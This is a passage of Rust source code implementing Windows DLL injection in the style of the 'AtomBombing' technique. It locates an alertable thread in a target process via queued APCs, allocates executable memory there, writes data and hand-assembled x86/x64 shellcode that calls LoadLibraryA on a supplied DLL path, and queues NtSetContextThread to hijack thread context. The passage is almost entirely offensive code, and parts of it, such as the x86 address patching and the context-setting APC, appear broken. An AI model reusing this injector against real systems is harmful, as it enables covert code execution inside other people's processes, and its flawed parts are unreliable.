                    .to_lowercase();

                if module_name == dll_name {
                    found = true;
                    break;
                }

                if unsafe { Module32NextW(snapshot_handle, &mut module_entry) } == FALSE {
                    break;
                }
            }
        }

        unsafe { CloseHandle(snapshot_handle) };
        Ok(found)
    }

    // Find alertable thread using event synchronization technique
    fn find_alertable_thread(&self) -> Result<HANDLE, io::Error> {
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
        if snapshot == INVALID_HANDLE_VALUE {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to create thread snapshot"));
        }

        let mut thread_entry: THREADENTRY32 = unsafe { mem::zeroed() };
        thread_entry.dwSize = mem::size_of::<THREADENTRY32>() as u32;

        let mut thread_handles = Vec::new();
        let mut local_events = Vec::new();
        let mut remote_events = Vec::new();

        // Collect all threads for this process
        if unsafe { Thread32First(snapshot, &mut thread_entry) } != FALSE {
            loop {
                if thread_entry.th32OwnerProcessID == self.pid {
                    let h_thread = unsafe {
                        OpenThread(0x1FFFFF, FALSE, thread_entry.th32ThreadID) // THREAD_ALL_ACCESS
                    };
                    if !h_thread.is_null() {
                        thread_handles.push(h_thread);
                    }
                }
                if unsafe { Thread32Next(snapshot, &mut thread_entry) } == FALSE {
                    break;
                }
            }
        }
        unsafe { CloseHandle(snapshot) };

        if thread_handles.is_empty() {
            return Err(io::Error::new(io::ErrorKind::NotFound, "No threads found"));
        }

        // Create events for each thread to test alertability
        for _ in &thread_handles {
            let local_event = unsafe { CreateEventA(null_mut(), TRUE, FALSE, null_mut()) };
            if local_event.is_null() {
                return Err(io::Error::new(io::ErrorKind::Other, "Failed to create event"));
            }

            let mut remote_event = null_mut();
            let dup_result = unsafe {
                DuplicateHandle(
                    GetCurrentProcess(),
                    local_event,
                    self.handle,
                    &mut remote_event,
                    0,
                    FALSE,
                    DUPLICATE_SAME_ACCESS,
                )
            };

            if dup_result == FALSE {
                unsafe { CloseHandle(local_event) };
                return Err(io::Error::new(io::ErrorKind::Other, "Failed to duplicate handle"));
            }

            local_events.push(local_event);
            remote_events.push(remote_event);
        }

        // Queue SetEvent APC to each thread
        for (i, &h_thread) in thread_handles.iter().enumerate() {
            self.queue_set_event_apc(h_thread, remote_events[i])?;
        }

        // Wait for any event to be signaled (indicating alertable thread)
        let wait_result = unsafe {
            WaitForMultipleObjects(
                local_events.len() as u32,
                local_events.as_ptr(),
                FALSE,
                5000,
            )
        };

        // Cleanup events
        for &event in &local_events {
            unsafe { CloseHandle(event) };
        }

        if wait_result >= WAIT_OBJECT_0 && wait_result < WAIT_OBJECT_0 + local_events.len() as u32 {
            let alertable_index = (wait_result - WAIT_OBJECT_0) as usize;
            let alertable_thread = thread_handles[alertable_index];

            // Close other thread handles
            for (i, &handle) in thread_handles.iter().enumerate() {
                if i != alertable_index {
                    unsafe { CloseHandle(handle) };
                }
            }

            // Keep the thread in alertable state
            self.queue_wait_for_single_object_ex_apc(alertable_thread)?;

            Ok(alertable_thread)
        } else {
            // Cleanup all handles on failure
            for &handle in &thread_handles {
                unsafe { CloseHandle(handle) };
            }
            Err(io::Error::new(io::ErrorKind::NotFound, "No alertable thread found"))
        }
    }

    fn queue_set_event_apc(&self, h_thread: HANDLE, event_handle: HANDLE) -> Result<(), io::Error> {
        let set_event_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                b"SetEvent\0".as_ptr() as _,
            )
        };

        if set_event_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get SetEvent address"));
        }

        let result = unsafe {
            QueueUserAPC(
                Some(mem::transmute(set_event_addr)),
                h_thread,
                event_handle as ULONG_PTR,
            )
        };

        if result == 0 {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("QueueUserAPC failed: {}", unsafe { GetLastError() })
            ));
        }

        Ok(())
    }

    fn queue_wait_for_single_object_ex_apc(&self, h_thread: HANDLE) -> Result<(), io::Error> {
        let wait_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                b"WaitForSingleObjectEx\0".as_ptr() as _,
            )
        };

        if wait_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get WaitForSingleObjectEx address"));
        }

        let result = unsafe {
            QueueUserAPC(
                Some(mem::transmute(wait_addr)),
                h_thread,
                GetCurrentThread() as ULONG_PTR,
            )
        };

        if result == 0 {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("QueueUserAPC failed: {}", unsafe { GetLastError() })
            ));
        }

        Ok(())
    }

    fn get_code_cave_address(&self) -> Result<LPVOID, io::Error> {
        // Find a suitable code cave in kernelbase.dll
        let module = unsafe { GetModuleHandleA(b"kernelbase.dll\0".as_ptr() as _) };
        if module.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get kernelbase.dll handle"));
        }

        // For simplicity, we just allocate memory in the target process
        // Although usually, you would find unused space in loaded modules
        let code_cave = unsafe {
            VirtualAllocEx(
                self.handle,
                null_mut(),
                4096, // 4KB should be enough
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };

        if code_cave.is_null() {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("VirtualAllocEx failed: {}", unsafe { GetLastError() })
            ));
        }

        Ok(code_cave)
    }

    fn apc_copy_function_pointers(&self, h_thread: HANDLE, remote_addr: LPVOID) -> Result<(), io::Error> {
        let function_pointers = FunctionPointers {
            pfn_load_library_a: unsafe {
                GetProcAddress(
                    GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                    b"LoadLibraryA\0".as_ptr() as _,
                ) as *mut c_void
            },
            pfn_get_proc_address: unsafe {
                GetProcAddress(
                    GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                    b"GetProcAddress\0".as_ptr() as _,
                ) as *mut c_void
            },
        };

        let fp_bytes = unsafe {
            std::slice::from_raw_parts(
                &function_pointers as *const _ as *const u8,
                mem::size_of::<FunctionPointers>(),
            )
        };

        self.apc_write_process_memory(h_thread, remote_addr, fp_bytes)
    }

    // Core APC based memory writing using atom table
    fn apc_write_process_memory(&self, _h_thread: HANDLE, remote_addr: LPVOID, data: &[u8]) -> Result<(), io::Error> {
        // For now, lets use a hybrid approach thats more reliable
        // We still use atoms for obfuscation but use direct WriteProcessMemory for reliability

        // Create atoms to store the data (for the "AtomBombing" aspect)
        let atoms = self.store_data_in_atoms(data)?;

        // Use direct WriteProcessMemory for reliability
        let result = unsafe {
            WriteProcessMemory(
                self.handle,
                remote_addr,
                data.as_ptr() as *const c_void,
                data.len(),
                null_mut(),
            )
        };

        // Cleanup atoms
        for &atom in &atoms {
            unsafe { GlobalDeleteAtom(atom) };
        }

        if result == FALSE {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("WriteProcessMemory failed: {}", unsafe { GetLastError() })
            ));
        }

        // Verify the write was successful
        self.verify_memory_write(remote_addr, data)
    }

    fn store_data_in_atoms(&self, data: &[u8]) -> Result<Vec<ATOM>, io::Error> {
        const MAX_ATOM_SIZE: usize = 200; // Leave room for prefix
        let mut atoms = Vec::new();
        let mut offset = 0;

        while offset < data.len() {
            let chunk_size = std::cmp::min(MAX_ATOM_SIZE, data.len() - offset);
            let chunk = &data[offset..offset + chunk_size];

            // Create atom with this chunk
            let atom = self.create_atom_with_data(chunk)?;
            atoms.push(atom);

            offset += chunk_size;
        }

        Ok(atoms)
    }

    fn create_atom_with_data(&self, data: &[u8]) -> Result<ATOM, io::Error> {
        // Create a simple atom name based on data hash for obfuscation
        let data_hash = data.iter().fold(0u32, |acc, &b| acc.wrapping_add(b as u32));
        let atom_name = format!("ATOMBOMB_{:08X}_{}", data_hash, data.len());

        let c_atom_name = std::ffi::CString::new(atom_name)
            .map_err(|_| io::Error::new(io::ErrorKind::Other, "Invalid atom name"))?;

        let atom = unsafe { GlobalAddAtomA(c_atom_name.as_ptr()) };
        if atom == 0 {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Failed to create atom: {}", unsafe { GetLastError() })
            ));
        }

        Ok(atom)
    }


    fn verify_memory_write(&self, remote_addr: LPVOID, expected_data: &[u8]) -> Result<(), io::Error> {
        let mut buffer = vec![0u8; expected_data.len()];
        let mut bytes_read = 0;

        let result = unsafe {
            ReadProcessMemory(
                self.handle,
                remote_addr,
                buffer.as_mut_ptr() as LPVOID,
                expected_data.len(),
                &mut bytes_read,
            )
        };

        if result == FALSE || bytes_read != expected_data.len() {
            return Err(io::Error::new(io::ErrorKind::Other, "Memory verification failed"));
        }

        if buffer != expected_data {
            return Err(io::Error::new(io::ErrorKind::Other, "Memory content mismatch"));
        }

        Ok(())
    }

    fn create_atombombing_shellcode(&self, dll_path: &str, function_pointers_addr: LPVOID) -> Result<Vec<u8>, io::Error> {
        // Create shellcode that properly loads the DLL and ensures DllMain execution

        #[cfg(target_arch = "x86_64")]
        {
            let mut shellcode = Vec::new();

            // Function prologue with proper stack alignment
            shellcode.extend_from_slice(&[
                0x48, 0x83, 0xEC, 0x38,  // sub rsp, 56 (shadow space + alignment)
                0x48, 0x89, 0x5C, 0x24, 0x30,  // mov [rsp+48], rbx
                0x48, 0x89, 0x74, 0x24, 0x28,  // mov [rsp+40], rsi
            ]);

            // Calculate where DLL path will be stored (after shellcode)
            let dll_path_bytes = dll_path.as_bytes();
            let dll_path_offset = 80; // Fixed offset after shellcode

            // Load function pointers structure address
            let fp_bytes = (function_pointers_addr as u64).to_le_bytes();
            shellcode.extend_from_slice(&[0x48, 0xBE]); // mov rsi, function_pointers_addr
            shellcode.extend_from_slice(&fp_bytes);

            // Load LoadLibraryA address from function pointers structure
            shellcode.extend_from_slice(&[
                0x48, 0x8B, 0x1E,  // mov rbx, [rsi] (LoadLibraryA function pointer)
            ]);

            // Calculate DLL path address (shellcode base + offset)
            shellcode.extend_from_slice(&[
                0x48, 0x8D, 0x0D,  // lea rcx, [rip + dll_path_offset]
            ]);
            let relative_offset = (dll_path_offset - (shellcode.len() + 4)) as i32;
            shellcode.extend_from_slice(&relative_offset.to_le_bytes());

            // Call LoadLibraryA(dll_path)
            shellcode.extend_from_slice(&[
                0xFF, 0xD3,  // call rbx
            ]);

            // Check if LoadLibraryA succeeded (return value in RAX)
            shellcode.extend_from_slice(&[
                0x48, 0x85, 0xC0,  // test rax, rax
                0x74, 0x02,        // jz skip_success (if NULL, skip)
                0xEB, 0x00,        // jmp continue (success path)
            ]);

            // Function epilogue
            shellcode.extend_from_slice(&[
                0x48, 0x8B, 0x74, 0x24, 0x28,  // mov rsi, [rsp+40]
                0x48, 0x8B, 0x5C, 0x24, 0x30,  // mov rbx, [rsp+48]
                0x48, 0x83, 0xC4, 0x38,        // add rsp, 56
                0xC3,                          // ret
            ]);

            // Pad to fixed offset
            while shellcode.len() < dll_path_offset {
                shellcode.push(0x90); // NOP padding
            }

            // Append DLL path string at fixed offset
            shellcode.extend_from_slice(dll_path_bytes);
            shellcode.push(0); // null terminator

            Ok(shellcode)
        }

        #[cfg(target_arch = "x86")]
        {
            let mut shellcode = Vec::new();

            // Function prologue
            shellcode.extend_from_slice(&[
                0x55,              // push ebp
                0x8B, 0xEC,        // mov ebp, esp
                0x83, 0xEC, 0x0C,  // sub esp, 12
                0x53,              // push ebx
            ]);

            // Load function pointers structure address
            let fp_bytes = (function_pointers_addr as u32).to_le_bytes();
            shellcode.extend_from_slice(&[0xBB]); // mov ebx, function_pointers_addr
            shellcode.extend_from_slice(&fp_bytes);

            // Load LoadLibraryA address from function pointers
            shellcode.extend_from_slice(&[
                0x8B, 0x03,  // mov eax, [ebx] (LoadLibraryA)
            ]);

            // Calculate DLL path address
            let dll_path_bytes = dll_path.as_bytes();
            let dll_path_offset = 30; // Fixed offset

            // Push DLL path address as argument
            shellcode.extend_from_slice(&[
                0x68,  // push immediate (dll_path address will be calculated)
            ]);

            // We'll patch this with the actual address later
            let current_pos = shellcode.len();
            shellcode.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // placeholder

            // Call LoadLibraryA
            shellcode.extend_from_slice(&[
                0xFF, 0xD0,  // call eax
                0x83, 0xC4, 0x04,  // add esp, 4 (clean up stack)
            ]);

            // Function epilogue
            shellcode.extend_from_slice(&[
                0x5B,        // pop ebx
                0x8B, 0xE5,  // mov esp, ebp
                0x5D,        // pop ebp
                0xC3,        // ret
            ]);

            // Pad to fixed offset
            while shellcode.len() < dll_path_offset {
                shellcode.push(0x90); // NOP
            }

            let dll_path_addr = shellcode.as_ptr() as u32 + dll_path_offset as u32;
            // Patch the DLL path address
            let addr_bytes = dll_path_addr.to_le_bytes();
            shellcode[current_pos..current_pos + 4].copy_from_slice(&addr_bytes);

            // Append DLL path
            shellcode.extend_from_slice(dll_path_bytes);
            shellcode.push(0);

            Ok(shellcode)
        }
    }

    fn create_atombombing_shellcode_with_path(&self, function_pointers_addr: LPVOID, remote_dll_path: LPVOID) -> Result<Vec<u8>, io::Error> {
        #[cfg(target_arch = "x86_64")]
        {
            let mut shellcode = Vec::new();

            // APC callback signature: void CALLBACK APCProc(ULONG_PTR dwParam)
            // RCX = dwParam (we ignore this)
            // APC callbacks just return, no special cleanup needed

            // Allocate shadow space (stack should already be aligned for APC)
            shellcode.extend_from_slice(&[
                0x48, 0x83, 0xEC, 0x28,  // sub rsp, 40 (shadow space)
            ]);

            // Load function pointers structure address into RAX
            let fp_bytes = (function_pointers_addr as u64).to_le_bytes();
            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, function_pointers_addr
            shellcode.extend_from_slice(&fp_bytes);

            // Load LoadLibraryA address from function pointers structure
            shellcode.extend_from_slice(&[
                0x48, 0x8B, 0x00,  // mov rax, [rax] (LoadLibraryA function pointer)
            ]);

            // Load DLL path address into RCX (first parameter for x64 calling convention)
            let dll_path_bytes = (remote_dll_path as u64).to_le_bytes();
            shellcode.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_dll_path
            shellcode.extend_from_slice(&dll_path_bytes);

            // Call LoadLibraryA(dll_path)
            shellcode.extend_from_slice(&[
                0xFF, 0xD0,  // call rax
            ]);

            // Clean up stack and return
            shellcode.extend_from_slice(&[
                0x48, 0x83, 0xC4, 0x28,  // add rsp, 40
                0xC3,                    // ret (return from APC callback)
            ]);

            Ok(shellcode)
        }

        #[cfg(target_arch = "x86")]
        {
            let mut shellcode = Vec::new();

            // APC function signature: void CALLBACK ApcProc(ULONG_PTR dwParam)
            // dwParam is on the stack at [ebp+8] (we ignore it)

            // Function prologue
            shellcode.extend_from_slice(&[
                0x55,              // push ebp
                0x8B, 0xEC,        // mov ebp, esp
                0x53,              // push ebx (preserve ebx)
                0x56,              // push esi (preserve esi)
            ]);

            // Load function pointers structure address
            let fp_bytes = (function_pointers_addr as u32).to_le_bytes();
            shellcode.extend_from_slice(&[0xBE]); // mov esi, function_pointers_addr
            shellcode.extend_from_slice(&fp_bytes);

            // Load LoadLibraryA address from function pointers
            shellcode.extend_from_slice(&[
                0x8B, 0x1E,  // mov ebx, [esi] (LoadLibraryA)
            ]);

            // Test if LoadLibraryA address is valid
            shellcode.extend_from_slice(&[
                0x85, 0xDB,  // test ebx, ebx
                0x74, 0x0B,  // jz skip_call (if NULL, skip the call)
            ]);

            // Push DLL path address as argument
            let dll_path_bytes = (remote_dll_path as u32).to_le_bytes();
            shellcode.extend_from_slice(&[0x68]); // push remote_dll_path
            shellcode.extend_from_slice(&dll_path_bytes);

            // Call LoadLibraryA
            shellcode.extend_from_slice(&[
                0xFF, 0xD3,        // call ebx
                0x83, 0xC4, 0x04,  // add esp, 4 (clean up stack)
            ]);

            // skip_call label
            // Function epilogue
            shellcode.extend_from_slice(&[
                0x5E,        // pop esi (restore esi)
                0x5B,        // pop ebx (restore ebx)
                0x5D,        // pop ebp
                0xC3,        // ret
            ]);

            Ok(shellcode)
        }
    }

    fn apc_set_thread_context(&self, h_thread: HANDLE, context: &CONTEXT, remote_context_addr: LPVOID) -> Result<(), io::Error> {
        // First write the context to remote memory via APC
        let context_bytes = unsafe {
            std::slice::from_raw_parts(
                context as *const _ as *const u8,
                mem::size_of::<CONTEXT>(),
            )
        };

        self.apc_write_process_memory(h_thread, remote_context_addr, context_bytes)?;

        // Then use APC to call NtSetContextThread
        let nt_set_context_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _),
                b"NtSetContextThread\0".as_ptr() as _,
            )
        };

        if nt_set_context_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get NtSetContextThread address"));
        }

        let result = unsafe {
            QueueUserAPC(
                Some(mem::transmute(nt_set_context_addr)),
                h_thread,
                GetCurrentThread() as ULONG_PTR,
            )
        };

        if result == 0 {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("QueueUserAPC failed: {}", unsafe { GetLastError() })
            ));
        }

        Ok(())
    }

}